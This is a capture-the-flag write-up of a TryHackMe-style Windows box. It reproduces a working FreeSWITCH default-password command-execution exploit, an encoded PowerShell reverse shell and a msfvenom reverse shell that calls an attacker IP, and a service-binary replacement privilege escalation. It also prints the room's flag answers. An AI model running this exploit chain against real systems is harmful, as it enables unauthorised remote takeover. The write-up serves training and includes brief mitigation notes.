---
How low are your morals?
---

![](https://cdn.pixabay.com/photo/2020/04/25/11/12/electrocardiogram-5090337_960_720.jpg)

What are the flags?
This machine may be slower than normal to boot up and carry out operations. 

```
The approach taken on this challenge is a black-box approach. A black-box penetration test is when a vulnerability assessment on a target system is done with no internal knowledge of the target system. 

sudo — required to run -O
nmap — call nmap port scanner
10.10.173.161 — target host
-sS — TCP SYN scan
-sV — Service version detection
-Pn — Disable host discovery (no Ping)
-n — Never do DNS resolution
-O — OSdetection

┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -Pn -n -sS 10.10.173.161
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 15:45 EDT
Nmap scan report for 10.10.173.161
Host is up (0.20s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2022-09-24T19:33:40
|_Not valid after:  2023-03-26T19:33:40
|_ssl-date: 2022-09-25T19:45:54+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-25T19:45:52+00:00
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   190.37 ms 10.18.0.1
2   202.78 ms 10.10.173.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.74 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -O -Pn -n -sS 10.10.173.161


┌──(kali㉿kali)-[~]
└─$ ping 10.10.173.161     
PING 10.10.173.161 (10.10.173.161) 56(84) bytes of data.

OS Windows

FreeSWITCH

┌──(kali㉿kali)-[~]
└─$ searchsploit FreeSWITCH                             
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)               | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                  | windows/remote/47799.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ searchsploit -m windows/remote/47799.txt
  Exploit: FreeSWITCH 1.10.1 - Command Execution
      URL: https://www.exploit-db.com/exploits/47799
     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
File Type: Python script, ASCII text executable

Copied to: /home/kali/47799.txt


                                                                                                         
┌──(kali㉿kali)-[~]
└─$ cat 47799.txt 
# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
# Date: 2019-12-19
# Exploit Author: 1F98D
# Vendor Homepage: https://freeswitch.com/
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
# Version: 1.10.1
# Tested on: Windows 10 (x64)
#
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
#
# -- Example --
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
# Authenticated
# Content-Type: api/response
# Content-Length: 20
#
# nt authority\system
#

#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 3:
    print('Missing arguments')
    print('Usage: freeswitch-exploit.py <target> <cmd>')
    sys.exit(1)

ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='ClueCon' # default password for FreeSWITCH

s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
        response = s.recv(8096).decode()
        print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)   

FreeSWITCH is an open-source application server for real-time communication. The application will execute any system commands supplied by an authenticated user according to the exploit. It also shows,

    1. The default password ClueCon.
    2. api system “command” is used to communicate once authenticated.
    3. Press the enter key twice to send the commands to the API.

https://www.revshells.com/

┌──(kali㉿kali)-[~]
└─$ nc 10.10.173.161 8021
Content-Type: auth/request

auth ClueCon

Content-Type: command/reply
Reply-Text: +OK accepted

api system whoami

Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
api system "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQA4AC4AMQAuADcANwAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
whoami
Ncat: Connection from 10.10.173.161.
Ncat: Connection from 10.10.173.161:49898.
win-eom4pk0578n\nekrotic
PS C:\Program Files\FreeSWITCH> whoami
win-eom4pk0578n\nekrotic

priv esc

Enumeration

One of the things to look for when enumerating windows for privilege escalation is an unquoted service path. Suppose a service has any spaces in the path to the executable file. In that case, unprivileged users can put a malicious file in the path, giving them SYSTEM privileges when the privileged user restarts the service. The script below looks for Win32 services on the host with unquoted service paths, not in the Windows folder.


PS C:\Program Files\FreeSWITCH> Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch "`"" -and $_.PathName -inotmatch ":\\Windows\\" }| Select Name,Pathname

Name            Pathname                                                                                               
----            --------                                                                                               
OpenClinicHttp  c:\projects\openclinic\tomcat8\bin\tomcat8.exe //RS//OpenClinicHttp                                    
OpenClinicMySQL c:\projects\openclinic\mariadb\bin\mysqld.exe --defaults-file=c:/projects/openclinic/mariadb/my.ini ...


The search found two results, tomcat8.exe and mysqld.exe, both located in the C:\projects\openclinic\… directory. Unfortunately, there is no space in the path to both executables, so this is not very useful since I cannot poison the path. But neither of these files are standard to Windows, and appear to be sitting in a dedicated projects folder in the root directory, which shows some importance of this location and warrants additional investigation.

The next step is to see what permissions the nekrotic user has on these files. We can enumerate the access control list using the following PowerShell command.

PS C:\Program Files\FreeSWITCH> Get-Acl -Path "c:\projects\openclinic\mariadb\bin\mysqld.exe" | select *


PSPath                  : Microsoft.PowerShell.Core\FileSystem::C:\projects\openclinic\mariadb\bin\mysqld.exe
PSParentPath            : Microsoft.PowerShell.Core\FileSystem::C:\projects\openclinic\mariadb\bin
PSChildName             : mysqld.exe
PSDrive                 : C
PSProvider              : Microsoft.PowerShell.Core\FileSystem
CentralAccessPolicyId   : 
CentralAccessPolicyName : 
Path                    : Microsoft.PowerShell.Core\FileSystem::C:\projects\openclinic\mariadb\bin\mysqld.exe
Owner                   : BUILTIN\Administrators
Group                   : WIN-EOM4PK0578N\None
Access                  : {System.Security.AccessControl.FileSystemAccessRule, 
                          System.Security.AccessControl.FileSystemAccessRule, 
                          System.Security.AccessControl.FileSystemAccessRule}
Sddl                    : O:BAG:S-1-5-21-343416598-1122472384-1008025730-513D:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x120
                          0a9;;;BU)
AccessToString          : NT AUTHORITY\SYSTEM Allow  FullControl
                          BUILTIN\Administrators Allow  FullControl
                          BUILTIN\Users Allow  ReadAndExecute, Synchronize
AuditToString           : 
AccessRightType         : System.Security.AccessControl.FileSystemRights
AccessRuleType          : System.Security.AccessControl.FileSystemAccessRule
AuditRuleType           : System.Security.AccessControl.FileSystemAuditRule
AreAccessRulesProtected : False
AreAuditRulesProtected  : False
AreAccessRulesCanonical : True
AreAuditRulesCanonical  : True

    The result shows
    - File is owned by the Administrator. This means the service will run with administrative privileges when the system starts.
    - BUILTIN\Users like the current authorized user nekrotic can read and execute but cannot modify the file.

Next, I enumerate the parent directories in the path to see if the nekrotic user has a write or modify permissions. If the target file has inherited the parent directory's permissions, it will allow me to modify the target file. We can check the file inheritance using the following PowerShell script.


PS C:\Program Files\FreeSWITCH> (Get-Acl -Path "c:\projects\openclinic\mariadb\bin\mysqld.exe").access


FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

FileSystemRights  : ReadAndExecute, Synchronize
AccessControlType : Allow
IdentityReference : BUILTIN\Users
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None


The result shows that ACLs are inherited from the parent directory. So onwards with enumeration.

PS C:\Program Files\FreeSWITCH> get-acl c:\projects | select *


PSPath                  : Microsoft.PowerShell.Core\FileSystem::C:\projects
PSParentPath            : Microsoft.PowerShell.Core\FileSystem::C:\
PSChildName             : projects
PSDrive                 : C
PSProvider              : Microsoft.PowerShell.Core\FileSystem
CentralAccessPolicyId   : 
CentralAccessPolicyName : 
Path                    : Microsoft.PowerShell.Core\FileSystem::C:\projects
Owner                   : BUILTIN\Administrators
Group                   : WIN-EOM4PK0578N\None
Access                  : {System.Security.AccessControl.FileSystemAccessRule, 
                          System.Security.AccessControl.FileSystemAccessRule, 
                          System.Security.AccessControl.FileSystemAccessRule, 
                          System.Security.AccessControl.FileSystemAccessRule...}
Sddl                    : O:BAG:S-1-5-21-343416598-1122472384-1008025730-513D:AI(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;
                          OICIID;0x1200a9;;;BU)(A;CIID;LC;;;BU)(A;CIID;DC;;;BU)(A;OICIIOID;GA;;;CO)
AccessToString          : NT AUTHORITY\SYSTEM Allow  FullControl
                          BUILTIN\Administrators Allow  FullControl
                          BUILTIN\Users Allow  ReadAndExecute, Synchronize
                          BUILTIN\Users Allow  AppendData
                          BUILTIN\Users Allow  CreateFiles
                          CREATOR OWNER Allow  268435456
AuditToString           : 
AccessRightType         : System.Security.AccessControl.FileSystemRights
AccessRuleType          : System.Security.AccessControl.FileSystemAccessRule
AuditRuleType           : System.Security.AccessControl.FileSystemAuditRule
AreAccessRulesProtected : False
AreAuditRulesProtected  : False
AreAccessRulesCanonical : True
AreAuditRulesCanonical  : True


Looking through the path, it appears that nekrotic have full read-write-execute permissions on the parent C:\projects directory. If the current user can modify files in the directory, an attacker can change one of any executables in the directory because they have inherited properties.

msfvenom

MsfVenom is "a Metasploit standalone generator" from Offensive Security, and we can use it to create binary to gain reverse shell as a system administrator on the target host. The following MsfVenom command creates windows reverse shell executable file, with the attacker's IP and port as the target. Since we are trying to replace the mysqld.exe file, we can pipe it into a file with that filename.


                                                                                                         
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.18.1.77 LPORT=1234 -f exe > mysqld.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

Then the malicious executable file is ready to go; I can switch to the target directory on the victim machine and use the process in the steps below to gain system administrator access.

    1. php -s [Attacker-IP]:[PORT] #Host the evil file on the attacker machine
    2. Rename-Item mysqld.exe mysqld.old #Change the filename of the target file to something else on the victim machine
    3. Invoke-WebRequest -Uri HTTP://[Attaker-IP]:[port]/mysqld.exe -outfile mysqld.exe #Download the file to the target host and replace the target file
    4. nc -nvlp 1234 #Setup a netcat listener on the attack machine
    5. Restart-Computer #Restart the target host

Netcat will catch the incoming connection when the target machine has restarted if everything works as intended.

PS C:\Program Files\FreeSWITCH> cd C:\projects\openclinic\mariadb\bin
PS C:\projects\openclinic\mariadb\bin> rename-item mysqld.exe mysqld_old.exe

┌──(kali㉿kali)-[~]
└─$ php -S 10.18.1.77:3000                 
[Sun Sep 25 17:05:17 2022] PHP 8.1.5 Development Server (http://10.18.1.77:3000) started
[Sun Sep 25 17:08:15 2022] 10.10.51.164:49834 Accepted
[Sun Sep 25 17:08:15 2022] 10.10.51.164:49834 [200]: GET /mysqld.exe
[Sun Sep 25 17:08:16 2022] 10.10.51.164:49834 Closing



PS C:\projects\openclinic\mariadb\bin> Invoke-webrequest -uri http://10.18.1.77:3000/mysqld.exe -outfile mysqld.exe
PS C:\projects\openclinic\mariadb\bin> restart-computer

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.51.164.
Ncat: Connection from 10.10.51.164:49670.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

Success! I am now connected as NT Authorit




Foothold was made possible on this machine because the default password was never changed. Attackers have used default passwords to control millions of devices, enabling them to create botnets. This vulnerability can be mitigated by changing the default password during setup. Developers must also make complex passwords requirements during setup.

Privilege escalation was possible through unintended file permissions. Administrators must configure ACLs to ensure inherited file permissions do not give lower privileged users the ability to manipulate files.

The last observation is about the process of penetration testing. It is a windy road. While looking for a path for privilege escalation, I started by looking for services with an unquoted file path to their executables. However, I used improperly implemented ACLs to gain system access successfully.


C:\Windows\system32>cd C:\Users\Nekrotic\Desktop
cd C:\Users\Nekrotic\Desktop

C:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  08:39    <DIR>          .
09/11/2021  08:39    <DIR>          ..
09/11/2021  08:39                38 root.txt
09/11/2021  08:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,560,438,272 bytes free

C:\Users\Nekrotic\Desktop>more user.txt
more user.txt
THM{64bca0843d535fa73eecdc59d27cbe26} 

C:\Users\Nekrotic\Desktop>more root.txt
more root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 


```

![[Pasted image 20220925153417.png]]


What is the user.txt flag?
*THM{64bca0843d535fa73eecdc59d27cbe26} *



What is the root.txt flag?
*THM{8c8bc5558f0f3f8060d00ca231a9fb5e}*


[[Fowsniff CTF]]